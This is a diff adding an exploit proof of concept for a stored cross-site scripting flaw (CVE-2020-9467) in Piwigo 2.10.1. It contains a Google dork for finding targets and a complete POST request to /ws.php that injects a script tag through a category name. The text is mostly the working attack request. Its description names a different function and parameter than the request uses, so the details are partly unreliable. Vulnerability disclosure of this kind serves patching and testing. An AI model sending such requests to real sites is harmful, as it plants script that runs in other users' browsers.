@@ -1,0 +1,34 @@
+# Exploit Title: Piwigo 2.10.1 - Cross Site Scripting
+# POC by: Iridium
+# Software Homepage: http://www.piwigo.org
+# Version : 2.10.1
+# Tested on: Linux & Windows
+# Category: webapps
+# Google Dork: intext: "Powered by Piwigo"
+# CVE : CVE-2020-9467
+
+######## Description ########
+
+Piwigo 2.10.1 has stored XSS via the file parameter in a /ws.php request
+because of the pwg.images.setInfo function.
+
+######## Proof of Concept ########
+
+*Request*
+
+POST /piwigo/ws.php?format=json HTTP/1.1
+Host: [victim]
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101
+Firefox/80.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 79
+Origin: http://[victim]
+Connection: close
+Referer: http://[victim]/piwigo/admin.php?page=photos_add&section=direct
+Cookie: pwg_id=08tksticrdkctrvj3gufqqbsnh
+
+method=pwg.categories.add&parent=1&name=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E
